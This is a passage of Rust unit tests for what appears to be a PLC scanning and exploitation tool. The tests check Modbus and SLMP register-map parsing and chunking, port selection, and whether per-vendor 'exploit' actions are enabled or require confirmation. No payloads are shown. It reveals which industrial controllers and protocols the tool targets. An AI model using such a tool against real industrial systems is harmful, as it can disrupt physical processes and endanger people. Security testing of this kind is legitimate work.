        assert_eq!(ranges[1], ModbusMapRange::new(ModbusTable::Input, 10, 20));
        assert_eq!(ranges[2], ModbusMapRange::new(ModbusTable::Coil, 5, 6));
        assert_eq!(ranges[3], ModbusMapRange::new(ModbusTable::Discrete, 7, 8));
    }

    #[test]
    fn parse_modbus_map_input_rejects_invalid_specs() {
        assert!(parse_modbus_map_input("bad:0:1").is_err());
        assert!(parse_modbus_map_input("hr:65536:1").is_err());
        assert!(parse_modbus_map_input("hr:65535:2").is_err());
        assert!(parse_modbus_map_input("hr:0:0").is_err());
        assert!(parse_modbus_map_input("hr:0").is_err());
        assert!(parse_modbus_map_input("hr:0:1,").is_err());
    }

    #[test]
    fn modbus_map_chunks_respects_protocol_limits() {
        let words = modbus_map_chunks(ModbusMapRange::new(ModbusTable::Holding, 0, 251));
        assert_eq!(words, vec![(0, 125), (125, 125), (250, 1)]);

        let bits = modbus_map_chunks(ModbusMapRange::new(ModbusTable::Coil, 0, 4001));
        assert_eq!(bits, vec![(0, 2000), (2000, 2000), (4000, 1)]);

        let all_words = modbus_map_chunks(ModbusMapRange::new(
            ModbusTable::Input,
            0,
            MODBUS_ADDRESS_SPACE,
        ));
        assert_eq!(all_words.first().copied(), Some((0, 125)));
        assert_eq!(all_words.last().copied(), Some((65500, 36)));
    }

    #[test]
    fn modbus_point_keys_include_table_namespace() {
        assert_eq!(ModbusTable::Holding.point_key(0), "HR40001");
        assert_eq!(ModbusTable::Input.point_key(10_000), "IR40001");
        assert_eq!(ModbusTable::Coil.point_key(10_000), "CO10001");
        assert_eq!(ModbusTable::Discrete.point_key(0), "DI10001");
    }

    #[test]
    fn parse_slmp_map_input_defaults_to_quick() {
        let ranges = parse_slmp_map_input("").unwrap();
        assert_eq!(
            ranges,
            vec![
                SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, 50),
                SlmpMapRange::new("M", SlmpDeviceKind::Bit, 0, 128),
            ]
        );
        assert_eq!(parse_slmp_map_input("quick").unwrap(), ranges);
    }

    #[test]
    fn parse_slmp_map_input_common_and_all() {
        let common = parse_slmp_map_input("common").unwrap();
        assert_eq!(
            common[0],
            SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, 1000)
        );
        assert_eq!(
            common[6],
            SlmpMapRange::new("B", SlmpDeviceKind::Bit, 0, 512)
        );

        let all = parse_slmp_map_input("all").unwrap();
        assert_eq!(all.len(), 7);
        assert_eq!(
            all[0],
            SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, SLMP_ADDRESS_SPACE)
        );
        assert_eq!(
            all[6],
            SlmpMapRange::new("B", SlmpDeviceKind::Bit, 0, SLMP_ADDRESS_SPACE)
        );
    }

    #[test]
    fn parse_slmp_map_input_custom_ranges_and_aliases() {
        let ranges = parse_slmp_map_input("d:0:500,markers:10:20,link-registers:5:6").unwrap();
        assert_eq!(
            ranges[0],
            SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, 500)
        );
        assert_eq!(
            ranges[1],
            SlmpMapRange::new("M", SlmpDeviceKind::Bit, 10, 20)
        );
        assert_eq!(
            ranges[2],
            SlmpMapRange::new("W", SlmpDeviceKind::Word, 5, 6)
        );
    }

    #[test]
    fn parse_slmp_map_input_rejects_invalid_specs() {
        assert!(parse_slmp_map_input("bad:0:1").is_err());
        assert!(parse_slmp_map_input("d:16777216:1").is_err());
        assert!(parse_slmp_map_input("d:16777215:2").is_err());
        assert!(parse_slmp_map_input("d:0:0").is_err());
        assert!(parse_slmp_map_input("d:0").is_err());
        assert!(parse_slmp_map_input("d:0:1,").is_err());
    }

    #[test]
    fn slmp_map_chunks_respects_protocol_limits() {
        let words = slmp_map_chunks(SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, 1921));
        assert_eq!(words, vec![(0, 960), (960, 960), (1920, 1)]);

        let bits = slmp_map_chunks(SlmpMapRange::new("M", SlmpDeviceKind::Bit, 0, 7169));
        assert_eq!(bits, vec![(0, 3584), (3584, 3584), (7168, 1)]);
    }

    fn app_with_device(vendor: &str, fields: Value) -> App {
        let (tx, rx) = mpsc::channel();
        let mut list_state = ListState::default();
        list_state.select(Some(0));
        App {
            devices: vec![DeviceRecord {
                id: 1,
                ip: "192.168.1.10".to_string(),
                vendor: vendor.to_string(),
                last_seen: 0,
                fields,
            }],
            list_state,
            mode: Mode::Normal,
            zoom_from: Mode::Normal,
            quit_confirm: false,
            monitor_stop: None,
            input_buf: String::new(),
            output_lines: Vec::new(),
            output_scroll: 0,
            logs: VecDeque::new(),
            scan_rx: rx,
            scan_tx: tx,
            scan_menu_sel: 0,
            exploit_defs: exploits_for(vendor),
            exploit_sel: 0,
            pending_exploit: None,
            vendor_override: None,
            vendor_pick_sel: 0,
            filter: String::new(),
            filtered_indices: vec![0],
            active_jobs: 0,
        }
    }

    #[test]
    fn schneider_capabilities_do_not_assume_modbus_from_udp_identity() {
        let app = app_with_device(
            "schneider",
            serde_json::json!({
                "name": "TM241CE24T",
                "discovery_transport": "udp",
                "cap_identity_confirmed": true,
                "cap_schneider_udp": true,
                "cap_modbus_tcp": false,
                "web_port": 80
            }),
        );
        let caps = SchneiderCapabilities::from_device(app.selected_device().unwrap());
        assert!(caps.identity_confirmed);
        assert!(caps.udp_discovery_confirmed);
        assert!(!caps.modbus_tcp_confirmed);

        let map = &app.exploit_defs[4];
        assert!(!action_availability(&app, map).enabled);
    }

    #[test]
    fn schneider_generic_modbus_is_readable_but_not_identity_confirmed() {
        let app = app_with_device(
            "schneider",
            serde_json::json!({
                "name": "Schneider-compatible Modbus TCP 1502",
                "protocol": "modbus_tcp",
                "modbus_port": 1502,
                "cap_modbus_tcp": true,
                "cap_identity_confirmed": false
            }),
        );
        let caps = SchneiderCapabilities::from_device(app.selected_device().unwrap());
        assert!(caps.modbus_tcp_confirmed);
        assert!(!caps.identity_confirmed);

        assert!(action_availability(&app, &app.exploit_defs[4]).enabled);
        assert!(!action_availability(&app, &app.exploit_defs[0]).enabled);
    }

    #[test]
    fn schneider_fc90_availability_follows_family() {
        let classic = app_with_device(
            "schneider",
            serde_json::json!({
                "name": "Modicon M340",
                "protocol": "modbus_tcp",
                "modbus_port": 502,
                "cap_modbus_tcp": true,
                "cap_identity_confirmed": true,
                "fc90_family": "m340_quantum_premium"
            }),
        );
        assert!(action_availability(&classic, &classic.exploit_defs[15]).enabled);
        assert!(!action_availability(&classic, &classic.exploit_defs[17]).enabled);

        let tm221 = app_with_device(
            "schneider",
            serde_json::json!({
                "name": "TM221",
                "protocol": "modbus_tcp",
                "modbus_port": 502,
                "cap_modbus_tcp": true,
                "cap_identity_confirmed": true,
                "fc90_family": "tm221"
            }),
        );
        assert!(!action_availability(&tm221, &tm221.exploit_defs[15]).enabled);
        assert!(action_availability(&tm221, &tm221.exploit_defs[17]).enabled);
    }

    #[test]
    fn schneider_risky_actions_require_confirmation() {
        let app = app_with_device(
            "schneider",
            serde_json::json!({
                "protocol": "modbus_tcp",
                "modbus_port": 1502,
                "cap_modbus_tcp": true
            }),
        );
        assert!(!requires_confirmation(&app.exploit_defs[4]));
        assert!(requires_confirmation(&app.exploit_defs[1]));
        assert!(requires_confirmation(&app.exploit_defs[7]));
        assert!(requires_confirmation(&app.exploit_defs[12]));
    }

    #[test]
    fn protocol_capabilities_gate_non_schneider_actions() {
        let beckhoff = app_with_device(
            "beckhoff",
            serde_json::json!({
                "protocol": "ads_tcp",
                "ads_port": 48898,
                "web_port": 5120,
                "discovery_transport": "udp"
            }),
        );
        assert!(action_availability(&beckhoff, &beckhoff.exploit_defs[0]).enabled);
        assert!(action_availability(&beckhoff, &beckhoff.exploit_defs[6]).enabled);
        assert!(requires_confirmation(&beckhoff.exploit_defs[1]));
        assert!(requires_confirmation(&beckhoff.exploit_defs[8]));

        let no_ads = app_with_device(
            "beckhoff",
            serde_json::json!({
                "protocol": "ads_tcp",
                "ads_port": 48898,
                "cap_ads_tcp": false,
                "cap_beckhoff_web_candidate": true
            }),
        );
        assert!(!action_availability(&no_ads, &no_ads.exploit_defs[0]).enabled);
        assert!(action_availability(&no_ads, &no_ads.exploit_defs[3]).enabled);

        let mitsubishi = app_with_device(
            "mitsubishi",
            serde_json::json!({
                "plc_type": "Mitsubishi-compatible SLMP TCP 5007",
                "protocol": "slmp_tcp",
                "slmp_port": 5007,
                "cap_slmp_tcp": true,
                "cap_gxworks_udp": false
            }),
        );
        assert!(action_availability(&mitsubishi, &mitsubishi.exploit_defs[1]).enabled);
        assert!(!action_availability(&mitsubishi, &mitsubishi.exploit_defs[5]).enabled);
        assert!(requires_confirmation(&mitsubishi.exploit_defs[4]));
        assert!(requires_confirmation(&mitsubishi.exploit_defs[10]));
    }

    #[test]
    fn protocol_capability_fallbacks_cover_remaining_vendors() {
        for (vendor, fields) in [
            ("siemens", serde_json::json!({"s7_port": 102})),
            ("rockwell", serde_json::json!({"enip_port": 44818})),
            (
                "phoenix",
                serde_json::json!({"phoenix_info_port": 1962, "webvisit_port": 80}),
            ),
            ("ewon", serde_json::json!({"http_port": 80})),
            ("omron", serde_json::json!({"fins_port": 9600})),
            ("iec104", serde_json::json!({"iec104_port": 2404})),
        ] {
            let app = app_with_device(vendor, fields);
            assert!(
                action_availability(&app, &app.exploit_defs[0]).enabled,
                "{vendor} first action should be available"
            );
        }

        let udp_only_omron = app_with_device(
            "omron",
            serde_json::json!({
                "fins_port": 9600,
                "cap_fins_tcp": false,
                "cap_fins_udp": true
            }),
        );
        assert!(!action_availability(&udp_only_omron, &udp_only_omron.exploit_defs[0]).enabled);
    }

    #[test]
    fn action_port_uses_protocol_specific_ports() {
        let beckhoff = app_with_device(
            "beckhoff",
            serde_json::json!({"port": 48898, "ads_port": 49001, "web_port": 5120}),
        );
        assert_eq!(beckhoff.action_port("beckhoff", 0), 49001);
        assert_eq!(beckhoff.action_port("beckhoff", 3), 5120);

        let mitsubishi = app_with_device(
            "mitsubishi",
            serde_json::json!({"port": 5561, "slmp_port": 15007}),
        );
        assert_eq!(mitsubishi.action_port("mitsubishi", 4), 15007);
        assert_eq!(mitsubishi.action_port("mitsubishi", 8), 15007);

        let schneider = app_with_device(
            "schneider",
            serde_json::json!({"port": 1740, "modbus_port": 1502, "web_port": 8080}),
        );
        assert_eq!(schneider.action_port("schneider", 1), 8080);
        assert_eq!(schneider.action_port("schneider", 4), 1502);

        let phoenix = app_with_device(
            "phoenix",
            serde_json::json!({"port": 1962, "phoenix_info_port": 1962, "webvisit_port": 8080}),
        );
        assert_eq!(phoenix.action_port("phoenix", 0), 8080);
        assert_eq!(phoenix.action_port("phoenix", 4), 1962);
        assert_eq!(phoenix.action_port("phoenix", 5), 0);
        assert_eq!(phoenix.action_port("phoenix", 6), 0);
    }
}
